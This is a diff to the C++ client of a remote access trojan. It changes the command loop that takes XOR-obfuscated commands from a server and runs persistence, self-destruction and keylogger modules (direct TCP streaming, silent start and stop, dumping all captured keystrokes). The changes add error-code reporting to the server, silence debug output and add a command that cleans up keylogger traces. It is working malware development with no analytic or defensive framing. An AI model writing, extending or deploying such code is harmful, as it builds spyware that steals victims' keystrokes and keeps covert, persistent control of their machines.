@@ -6,7 +6,7 @@
 #include "../inc/other.h"
 #include "../inc/Exec.h"
 #include "../inc/Destruction.h"
-
+#include "../inc/ErrorCodes.h"
 
 using namespace std;
 
@@ -47,19 +47,19 @@ INT Connexion::openConnexion()
 INT Connexion::main()
 {   
     wstring command;
-    wstring status;
     vector <string> result;
     INT len_recv=0;    
     BOOL status_destruction = FALSE; //Test if error in Destruction
     WCHAR prog[20];
 
+    INT error_codes = 0;
     
     while(TRUE)
     {
         command = recvSafe(); //Recv safe and decrypt xor
         
-        wcout << "command recv: " << command << "<----" <<endl;
-        wcout << "command len: " << command.length() << endl;
+        //wcout << "command recv: " << command << "<----" <<endl;
+        //wcout << "command len: " << command.length() << endl;
         
 
         if(command.find(L"is_life?") != wstring::npos)
@@ -90,7 +90,6 @@ INT Connexion::main()
                 else
                 {
                     result.push_back(ConvertWideToUtf8(getPath())); 
-                    wcout << "push ok " << endl;
                     wcout << getPath() << endl;  
                 }
 
@@ -124,12 +123,11 @@ INT Connexion::main()
             {
                 //In mod persistence.
                 Persistence persistence(a_is_admin, a_path_prog);
-                persistence.main();
+                error_codes = persistence.main();
 
                 if(command.substr(16) == L"default") //The client sends a response to the server to report whether the persistence was successfully completed. 
                 {
-                    //default persi 
-                    send(a_sock, (char *)XOREncryption(L"\r\n").c_str(), 4 ,0);    
+                    sendSafe(L"MOD_PERSISTENCE:" SPLIT + int_to_wstring(error_codes));
                 }
                 else
                 {
@@ -142,22 +140,12 @@ INT Connexion::main()
             { 
                 Destruction destruction(a_path_prog);
 
-                status_destruction = destruction.main();
-
-                if(status_destruction) //Go destruction !
-                {
-                    //If error
-                    status = L"MOD_DESTRUCTION:" SPLIT  "True";// "[-] An error occurred while executing the destroy mode.";
-                }
-                else
-                {
-                    status = L"MOD_DESTRUCTION:" SPLIT  "False";//"[+] The destruction mode is executed successfully.";
-                }  
+                error_codes = destruction.main();
 
                 if(command.substr(16,7) == L"default") //6 for default
                 {
                     //if default then send status at server. 
-                    sendSafe(status); //Send the statue to the server. The server will just display the status.
+                    sendSafe(L"MOD_DESTRUCTION:" SPLIT + int_to_wstring(error_codes)); //Send the statue to the server. The server will just display the status.
                 }
                 
                 else //else  substr(15,6) == "broadcast"
@@ -173,58 +161,50 @@ INT Connexion::main()
 
             else if(command.substr(0,14) == L"MOD_KEYLOGGER:")
             {
-                wcout << "MOD_KEYLOGGER" << endl;
+                wcout << "MOD_KEYLOGGER:" << endl;
                 
                 if(command.substr(14, 10) == L"direct_tcp")
                 {
                     wcout << "directcp" << endl;
-                    a_keylogger->directTcp();
+                    error_codes = a_keylogger->directTcp();
+                    sendSafe(L"MOD_KEYLOGGER:"SPLIT + int_to_wstring(error_codes));
                 } 
 
 
                 else if(command.substr(14, 16) == L"start_silencious")
                 {
                     wcout << " In start silencious" << endl;
-                    if(a_keylogger->silenciousStart())
-                    {
-                        //if  error
-                        status = L"MOD_KEYLOGGER:start_silencious:" SPLIT  "False";
-                    }
-                    else
-                    {
-                        //if not error
-                        status = L"MOD_KEYLOGGER:start_silencious:" SPLIT  "True";
-                    }
-                    sendSafe(status);
+
+                    error_codes = a_keylogger->silenciousStart();
+                    sendSafe(L"MOD_KEYLOGGER:start_silencious:" SPLIT + int_to_wstring(error_codes));
                 }
 
 
                 else if(command.substr(14, 15)== L"stop_silencious")
                 {
                     wcout << "in stop_silencious" << endl;
-                    if(a_keylogger->silenciousStop())
-                    {
-                        //if error
-                        wcout << "stop_silencious error" << endl;
-                        status = L"MOD_KEYLOGGER:stop_silencious:" SPLIT "False";
-                    }
-                    else
-                    {
-                        //if not error
-                        wcout << "stop_silencious if not error" << endl;
-                        status = L"MOD_KEYLOGGER:stop_silencious:" SPLIT "True";
-                    }
+                    
+                    error_codes = a_keylogger->silenciousStop();
+
+                    sendSafe(L"MOD_KEYLOGGER:stop_silencious:" SPLIT + int_to_wstring(error_codes));
                 }
 
 
                 else if(command.substr(14, 8) == L"dump_all") 
                 {
-                  wcout << "in dump_all" << endl;
+                   wcout << "in dump_all" << endl;
                    vector<string> dump_all = a_keylogger->dumpAllData();
                    sendCommandSafe(dump_all);
                    dump_all.clear();
                 }
-                wcout << "in Connexion !" << endl;
+
+
+                else if(command.substr(14,16) == L"clean_silencious") //clean_silencious
+                {
+                    error_codes =  a_keylogger->silenciousClean();
+                
+                    sendSafe(L"MOD_KEYLOGGER:clean_silencious:" SPLIT + int_to_wstring(error_codes));
+                }
             }
 
             
